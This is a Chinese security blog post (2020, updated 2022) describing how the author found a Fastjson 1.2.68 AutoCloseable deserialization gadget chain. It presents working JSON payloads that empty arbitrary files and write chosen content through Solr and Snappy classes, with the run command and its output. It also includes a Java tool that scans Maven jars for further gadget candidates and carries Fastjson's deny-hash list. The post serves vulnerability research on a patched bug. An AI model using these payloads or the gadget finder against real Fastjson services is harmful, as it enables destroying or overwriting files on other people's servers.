@@ -1,0 +1,617 @@
+﻿标题: 寻找Fastjson 1.2.68 AutoCloseable利用链
+
+创建: 2020-08-08 17:23
+更新: 2022-08-25 12:59
+链接: https://scz.617.cn/web/202008081723.txt
+
+--------------------------------------------------------------------------
+
+目录:
+
+    ☆ 前言
+    ☆ 1.2.68漏洞复现尝试
+        1) 清空指定文件
+            1.1) AutoCloseable_TruncateFile.json
+            1.2) AutoCloseable_TruncateFile_1.json
+        2) 向指定文件写入指定内容(用到第三方库)
+    ☆ 我是如何找到利用链的
+        1) 已知公开信息
+        2) FindSomeClass3.java
+        3) 吐槽一下ClassGraph
+    ☆ 后记
+    ☆ 参考资源
+
+--------------------------------------------------------------------------
+
+☆ 前言
+
+文中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于
+企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，
+否则产生的一切后果自行承担。
+
+参[87]，浅蓝在2020.6.7公开了Fastjson 1.2.68 AutoCloseable漏洞细节。那个月
+正好被薅去干别的事，没有细究它。7月底继续学习Java漏洞，决定细究一番这个洞。
+
+用搜索引擎搜这个洞，发现绝大多数所谓分析该漏洞的文章并没有比[87]新增有效内
+容，如果非要说它们新增了什么的话，大概是在文末新增了这样一段样板戏:
+
+    经过努力，终于找到了一条利用链，但现在外面没有公开的PoC，我的也就暂不
+    放出来了，期待看到谁谁的新链。
+
+B味浓浓，很想点名喷之。真要看这个洞，直接看[87]就够够的，浅蓝还是很厚道的，
+该讲的细节一个没拉下，不需要冗余输出的伪分析一个也没有。作为该洞最早的公开
+信息源，没有提供现实世界的PoC，可以理解。推荐一下其个人主页:
+
+https://b1ue.cn/
+
+文章不多，绝不装X。
+
+我在Java漏洞方向没有长期积累，水平有限，细究这个洞后找不到rt.jar中的利用链。
+我没有那些大框架、大中间件的测试环境，所以也没有去找潜在的高危利用链。后来
+我想开了，咱也装不了Java大拿，就在第三方库中找软柿子捏，于是有了本文。
+
+不作漏洞分析，[87]把该讲的都讲清楚了，没啥好分析的。本文给出一个现实世界的
+极小众PoC，利用第三方库向指定文件写入指定内容。严格意义上讲，也不算现实世
+界的PoC，因为所用两个第三方库可能并不会同时出现，但至少比自己写一个纯原理
+性PoC要有说服力些。此外，本文写了我是怎么去找这条利用链的，简单点说，写程
+序在maven的本地仓库中愣找，先得到一个大致范围，再人工过滤。
+
+☆ 1.2.68漏洞复现尝试
+
+当时的测试环境是"RedHat 7.6+8u232+1.2.68"。
+
+1) 清空指定文件
+
+1.1) AutoCloseable_TruncateFile.json
+
+--------------------------------------------------------------------------
+{
+    '@type':"java.lang.AutoCloseable",
+    '@type':'java.io.FileOutputStream',
+    'file':'/tmp/nonexist',
+    'append':false
+}
+--------------------------------------------------------------------------
+
+将生成空文件"/tmp/nonexist"，如果已经存在，则清空原有内容。
+
+1.2) AutoCloseable_TruncateFile_1.json
+
+--------------------------------------------------------------------------
+{
+    '@type':"java.lang.AutoCloseable",
+    '@type':'java.io.FileWriter',
+    'file':'/tmp/nonexist',
+    'append':false
+}
+--------------------------------------------------------------------------
+
+抛出异常，但文件内容已被清空。
+
+2) 向指定文件写入指定内容(用到第三方库)
+
+--------------------------------------------------------------------------
+{
+    'stream':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'java.io.FileOutputStream',
+        'file':'/tmp/nonexist',
+        'append':false
+    },
+    'writer':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'org.apache.solr.common.util.FastOutputStream',
+        'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=',
+        'sink':
+        {
+            '$ref':'$.stream'
+        },
+        'start':38
+    },
+    'close':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'org.iq80.snappy.SnappyOutputStream',
+        'out':
+        {
+            '$ref':'$.writer'
+        }
+    }
+}
+--------------------------------------------------------------------------
+
+java \
+-cp "fastjson-1.2.68.jar:solr-solrj-6.6.2.jar:snappy-0.3.jar:." \
+FastjsonDeserialize2 AutoCloseable_solr_snappy.json
+
+$ cat /tmp/nonexist
+I just want to prove that I can do it.
+
+☆ 我是如何找到利用链的
+
+1) 已知公开信息
+
+参[87]，浅蓝是这么说的:
+
+--------------------------------------------------------------------------
+a)
+
+需要一个通过setter或构造函数指定文件路径的OutputStream
+
+b)
+
+需要一个通过setter或构造函数传入byte[]的OutputStream，并且可以通过setter或
+构造函数传入一个OutputStream，最后可以通过write()将传入的字节写入传入的
+OutputStream
+
+c)
+
+需要一个通过setter或构造函数传入一个 OutputStream，并且可以通过调用
+toString、hashCode、getter、setter、构造函数等调用传入的OutputStream的
+flush()
+--------------------------------------------------------------------------
+
+以上三个类组合在一起就能构造成一个写文件的利用链。
+
+2) FindSomeClass3.java
+
+纯手工找前述三种类不太可能，曾经在rt.jar中手工找过，学艺不精，未能得逞。退
+而求其次，在maven的本地仓库中寻找潜在可用的第三方库，这需要写程序完成。
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g -cp "fastjson-1.2.68.jar" FindSomeClass3.java
+ * java -cp "fastjson-1.2.68.jar:." FindSomeClass3 <dir>
+ */
+import java.io.*;
+import java.net.*;
+import java.util.*;
+import java.util.stream.Stream;
+import java.util.jar.*;
+import java.nio.file.*;
+import java.lang.reflect.*;
+import com.alibaba.fastjson.util.ASMUtils;
+
+public class FindSomeClass3
+{
+    private static long[]   denyHashCodes   = new long[]
+    {
+        0x80D0C70BCC2FEA02L,
+        0x86FC2BF9BEAF7AEFL,
+        0x87F52A1B07EA33A6L,
+        0x8EADD40CB2A94443L,
+        0x8F75F9FA0DF03F80L,
+        0x9172A53F157930AFL,
+        0x92122D710E364FB8L,
+        0x941866E73BEFF4C9L,
+        0x94305C26580F73C5L,
+        0x9437792831DF7D3FL,
+        0xA123A62F93178B20L,
+        0xA85882CE1044C450L,
+        0xAA3DAFFDB10C4937L,
+        0xAC6262F52C98AA39L,
+        0xAD937A449831E8A0L,
+        0xAE50DA1FAD60A096L,
+        0xAFFF4C95B99A334DL,
+        0xB40F341C746EC94FL,
+        0xB7E8ED757F5D13A2L,
+        0xBCDD9DC12766F0CEL,
+        0xC00BE1DEBAF2808BL,
+        0xC2664D0958ECFE4CL,
+        0xC7599EBFE3E72406L,
+        0xC8D49E5601E661A9L,
+        0xC963695082FD728EL,
+        0xD1EFCDF4B3316D34L,
+        0xD54B91CC77B239EDL,
+        0xD8CA3D595E982BACL,
+        0xDE23A0809A8B9BD6L,
+        0xDEFC208F237D4104L,
+        0xDF2DDFF310CDB375L,
+        0xE09AE4604842582FL,
+        0xE1919804D5BF468FL,
+        0xE2EB3AC7E56C467EL,
+        0xE603D6A51FAD692BL,
+        0xE9184BE55B1D962AL,
+        0xE9F20BAD25F60807L,
+        0xF3702A4A5490B8E8L,
+        0xF474E44518F26736L,
+        0xF7E96E74DFA58DBCL,
+        0xFC773AE20C827691L,
+        0xFD5BFC610056D720L,
+        0xFFA15BF021F1E37CL,
+        0xFFDD1A80F1ED3405L,
+        0x10E067CD55C5E5L,
+        0x761619136CC13EL,
+        0x3085068CB7201B8L,
+        0x45B11BC78A3ABA3L,
+        0x55CFCA0F2281C07L,
+        0xB6E292FA5955ADEL,
+        0xEE6511B66FD5EF0L,
+        0x100150A253996624L,
+        0x10B2BDCA849D9B3EL,
+        0x144277B467723158L,
+        0x14DB2E6FEAD04AF0L,
+        0x154B6CB22D294CFAL,
+        0x17924CCA5227622AL,
+        0x193B2697EAAED41AL,
+        0x1CD6F11C6A358BB7L,
+        0x1E0A8C3358FF3DAEL,
+        0x24D2F6048FEF4E49L,
+        0x24EC99D5E7DC5571L,
+        0x25E962F1C28F71A2L,
+        0x275D0732B877AF29L,
+        0x2ADFEFBBFE29D931L,
+        0x2B3A37467A344CDFL,
+        0x2D308DBBC851B0D8L,
+        0x313BB4ABD8D4554CL,
+        0x327C8ED7C8706905L,
+        0x332F0B5369A18310L,
+        0x339A3E0B6BEEBEE9L,
+        0x33C64B921F523F2FL,
+        0x34A81EE78429FDF1L,
+        0x3826F4B2380C8B9BL,
+        0x398F942E01920CF0L,
+        0x3B0B51ECBF6DB221L,
+        0x42D11A560FC9FBA9L,
+        0x43320DC9D2AE0892L,
+        0x440E89208F445FB9L,
+        0x46C808A4B5841F57L,
+        0x49312BDAFB0077D9L,
+        0x4A3797B30328202CL,
+        0x4BA3E254E758D70DL,
+        0x4BF881E49D37F530L,
+        0x4DA972745FEB30C1L,
+        0x4EF08C90FF16C675L,
+        0x4FD10DDC6D13821FL,
+        0x527DB6B46CE3BCBCL,
+        0x535E552D6F9700C1L,
+        0x5728504A6D454FFCL,
+        0x599B5C1213A099ACL,
+        0x5A5BD85C072E5EFEL,
+        0x5AB0CB3071AB40D1L,
+        0x5D74D3E5B9370476L,
+        0x5D92E6DDDE40ED84L,
+        0x5F215622FB630753L,
+        0x62DB241274397C34L,
+        0x63A220E60A17C7B9L,
+        0x665C53C311193973L,
+        0x6749835432E0F0D2L,
+        0x6A47501EBB2AFDB2L,
+        0x6FCABF6FA54CAFFFL,
+        0x746BD4A53EC195FBL,
+        0x74B50BB9260E31FFL,
+        0x75CC60F5871D0FD3L,
+        0x767A586A5107FEEFL,
+        0x7AA7EE3627A19CF3L,
+        0x7ED9311D28BF1A65L,
+        0x7ED9481D28BF417AL
+    };
+
+    private static void PrivateFindBlackname ( String typeName ) throws Exception
+    {
+        String      className   = typeName.replace('$', '.');
+        final long  BASIC       = 0xcbf29ce484222325L;
+        final long  PRIME       = 0x100000001b3L;
+        final long  h3          =
+            (((((BASIC ^ className.charAt(0))
+            * PRIME)
+            ^ className.charAt(1))
+            * PRIME)
+            ^ className.charAt(2))
+            * PRIME;
+        long        hash        = h3;
+        for ( int i = 3; i < className.length(); ++i )
+        {
+            hash   ^= className.charAt(i);
+            hash   *= PRIME;
+            if ( Arrays.binarySearch( denyHashCodes, hash ) >= 0 )
+            {
+                throw new Exception();
+            }
+        }
+        return;
+    }  /* end of PrivateFindBlackname */
+
+    private static void FilterConstructor ( Class clazz ) throws Exception
+    {
+        Constructor<?>[]    consarray       = clazz.getDeclaredConstructors();
+        int                 maxparamcount   = 0;
+        Constructor<?>      targetcons      = null;
+
+        for ( Constructor cons : consarray )
+        {
+            int         modifier        = cons.getModifiers();
+            if ( ( modifier & Modifier.PUBLIC ) == 0 )
+            {
+                continue;
+            }
+            int         paramcount      = cons.getParameterCount();
+            if ( paramcount == 0 )
+            {
+                continue;
+            }
+            if ( paramcount > maxparamcount )
+            {
+                maxparamcount   = paramcount;
+                targetcons      = cons;
+            }
+        }
+        if ( targetcons == null )
+        {
+            return;
+        }
+
+        String[]        lookupParameterNames
+                                        = ASMUtils.lookupParameterNames( targetcons );
+        if ( lookupParameterNames == null || lookupParameterNames.length == 0 )
+        {
+            return;
+        }
+
+        Class<?>[]      types           = targetcons.getParameterTypes();
+
+        for ( int i = 0; i < types.length; i++ )
+        {
+            if
+            (
+                OutputStream.class.isAssignableFrom( types[i] )
+            )
+            {
+                System.out.print
+                (
+                    String.format
+                    (
+                        "%s\n  %s\n",
+                        clazz.getName(),
+                        targetcons.toString()
+                    )
+                );
+                break;
+            }
+        }
+    }  /* end of FilterConstructor */
+
+    private static void FilterSetter ( Class clazz ) throws Exception
+    {
+        Method[]    methodarray = clazz.getMethods();
+
+        for ( Method method : methodarray )
+        {
+            String      methodName      = method.getName();
+            if ( methodName.length() < 4 )
+            {
+                continue;
+            }
+            if ( !methodName.startsWith( "set" ) )
+            {
+                continue;
+            }
+            char        c3              = methodName.charAt( 3 );
+            if ( !Character.isUpperCase( c3 ) )
+            {
+                continue;
+            }
+            int         modifier        = method.getModifiers();
+            if ( Modifier.isStatic( modifier ) )
+            {
+                continue;
+            }
+            Class<?>    returnType      = method.getReturnType();
+            if ( !returnType.equals( Void.TYPE ) )
+            {
+                continue;
+            }
+            Class<?>[]  parameterTypes  = method.getParameterTypes();
+            int         paramcount      = parameterTypes.length;
+            if ( paramcount != 1 )
+            {
+                continue;
+            }
+            if
+            (
+                OutputStream.class.isAssignableFrom( parameterTypes[0] )
+            )
+            {
+                System.out.print
+                (
+                    String.format
+                    (
+                        "%s\n  %s\n",
+                        clazz.getName(),
+                        method.toString()
+                    )
+                );
+            }
+        }
+    }  /* end of FilterSetter */
+
+    private static void GetInfoFromClass ( Class clazz ) throws Exception
+    {
+        if
+        (
+            ClassLoader.class.isAssignableFrom( clazz )
+            ||
+            javax.sql.DataSource.class.isAssignableFrom( clazz )
+            ||
+            javax.sql.RowSet.class.isAssignableFrom( clazz )
+        )
+        {
+            return;
+        }
+        if ( !AutoCloseable.class.isAssignableFrom( clazz ) )
+        {
+            return;
+        }
+        FilterConstructor( clazz );
+        FilterSetter( clazz );
+    }  /* end of GetInfoFromClass */
+
+    private static void EnumerateClassFromJar ( String JarFile )
+    {
+        try
+        {
+            URLClassLoader  ucl = URLClassLoader.newInstance
+            (
+                new URL[] { ( new File( JarFile ).toURI().toURL() ) }
+            );
+            JarInputStream  jis = new JarInputStream( new FileInputStream( JarFile ), false );
+            JarEntry        je;
+            String          EntryName;
+            String          ClassName;
+            Class           clazz;
+
+            while ( true )
+            {
+                je          = jis.getNextJarEntry();
+                if ( je == null )
+                {
+                    break;
+                }
+                EntryName   = je.getName();
+                if ( EntryName.endsWith( ".class" ) )
+                {
+                    ClassName   = EntryName.substring( 0, EntryName.length()-6 ).replace( "/", "." );
+                    try
+                    {
+                        PrivateFindBlackname( ClassName );
+                        clazz   = ucl.loadClass( ClassName );
+                        GetInfoFromClass( clazz );
+                    }
+                    catch ( Throwable t )
+                    {
+                    }
+                }
+            }
+        }
+        catch ( Exception e )
+        {
+            e.printStackTrace();
+        }
+    }  /* end of EnumerateClassFromJar */
+
+    private static void EnumerateFileFromDir ( String dir, String suffix )
+    {
+        try
+        (
+            Stream<Path>    paths   = Files.walk( Paths.get( dir ), FileVisitOption.FOLLOW_LINKS )
+        )
+        {
+            paths
+            .filter( Files::isRegularFile )
+            .map( p -> p.toString() )
+            .filter( name -> name.endsWith( suffix ) )
+            .peek( System.out::println )
+            .forEach( FindSomeClass3::EnumerateClassFromJar );
+        }
+        catch ( Throwable t )
+        {
+            t.printStackTrace();
+        }
+    }  /* end of EnumerateFileFromDir */
+
+    public static void main ( String[] argv )
+    {
+        String  dir = argv[0];
+        EnumerateFileFromDir( dir, ".jar" );
+    }
+}
+--------------------------------------------------------------------------
+
+FindSomeClass3.java是个示例性框架，根据需要写自己的过滤逻辑即可。有些代码
+没必要，懒得删减，领会精神。
+
+其输出结果需要用grep二次处理一下，比如:
+
+X:\Java\jdk1.8.0_221\bin\java -cp "fastjson-1.2.68.jar;." FindSomeClass3 E:\jar > FindSomeClass3.txt
+grep -E '^[^E]' -B 1 FindSomeClass3.txt > FindSomeClass3_mini.txt
+
+在FindSomeClass3_mini.txt中人工滤出
+
+org.iq80.snappy.SnappyOutputStream
+
+这一步要拼运气。起初只是象征性地在虚拟机中找了找，本地仓库中没有多少jar包。
+后来让金超前把他的几个G的本地仓库拷给我，这就大大增加了找到合适目标的可能。
+
+3) 吐槽一下ClassGraph
+
+实现FindSomeClass3.java时放狗搜过，想看看有什么成熟的轮子可用，找到
+ClassGraph，参[101]。ClassGraph的作者在stackoverflow的多个贴子中猛烈推荐它，
+我还真信过。
+
+测试后发现这玩意儿有很多缺陷与不足，简单列几点:
+
+--------------------------------------------------------------------------
+a)
+
+没有Class.isAssignableFrom()的等价实现，ClassInfo.extendsSuperclass()只能
+检查祖先类，不能检查祖先接口。虽然可以用ClassInfo.getSuperclasses()和
+ClassInfo.getInterfaces()自行实现Class.isAssignableFrom()，但为什么不直接
+提供一个？
+
+b)
+
+据说支持"javac -parameters"留下的形参名字，实测发现无法获取"javac -g"留下
+的形参名字，后者才是第三方库的主流。
+
+c)
+
+没有简单办法获取方法返回值类型
+
+d)
+
+没有简单办法获取方法参数类型的Class<?>表示
+--------------------------------------------------------------------------
+
+曾经艰难地尝试移植FindSomeClass3.java，使之使用ClassGraph，最终被其打败。
+为了检查指定jar包，用到ClassGraph.overrideClasspath()，或许正是这样带来的
+幺蛾子。
+
+ClassGraph不适用于FindSomeClass3.java这种目的，换个原始需求可能用得上，在
+此做个备忘。
+
+☆ 后记
+
+今天跟金超前吐槽，为啥我这么执著找一条这个洞的利用链，主要是看不惯除原发现
+者之外的一群2B藏着掖着的德性。原发现者不给PoC我理解，后来有一些吹NB的一通
+神吹装个B完事，这种特看不惯。他们应该是找到了一些链，但我觉得这没必要藏着
+掖着，尤其不是自带库的情况下。如果找着了，不吹这个牛，自己留着用，这也无可
+厚非。最恨这种说法，PoC还没有公开的，我的就不发了，怎么怎么的，你TM不发你
+吹个毛线啊，又不是漏洞原发现者。
+
+不过，有个例外，参[99]，作者Y4er是个老实人，把浅蓝的两个洞捋了一遍，汇总了
+一下非现实世界的PoC，坦言自己没有找到现实世界的PoC。他这篇对我没啥帮助，但
+我仍乐意对初次接触这个洞的朋友推荐一下，看老实人写的老实文章，开卷有益。
+
+去年我剁burp pro，就是看不惯有人藏着掖着，后来把这玩意儿打落神坛了吧。这次
+也一样，缘起看不惯。尽管这次实在是囿于水平低下，但我尽力过，诸君见谅。
+
+肯定有更贴近现实世界的高危利用链存在，我不混渗透圈，无缘得见。浅蓝还提到复
+制文件的利用链，无心亦无力寻找。或许还有RCE利用链，也说不定。
+
+本文只是我努力学习Java漏洞的一个小插曲，正如PoC所示:
+
+I just want to prove that I can do it.
+
+☆ 参考资源
+
+[87]
+    fastjson < 1.2.66 正则表达式拒绝服务漏洞 - 浅蓝 [2020-03-24]
+    https://b1ue.cn/archives/314.html
+
+    fastjson 1.2.68 最新版本有限制 autotype bypass - 浅蓝 [2020-05-09]
+    https://b1ue.cn/archives/348.html
+
+    fastjson 1.2.68 autotype bypass反序列化漏洞gadget的一种挖掘思路 - 浅蓝 [2020-06-07]
+    https://b1ue.cn/archives/382.html
+
+[99]
+    fastjson 1.2.68 bypass autotype - Y4er [2020-06-16]
+    https://y4er.com/post/fastjson-bypass-autotype-1268/
+    https://github.com/Y4er/fastjson-bypass-autotype-1.2.68
+
+[101]
+    Classpath Specification Mechanisms
+    https://github.com/classgraph/classgraph
+    https://repo1.maven.org/maven2/io/github/classgraph/classgraph/4.8.87/classgraph-4.8.87.jar
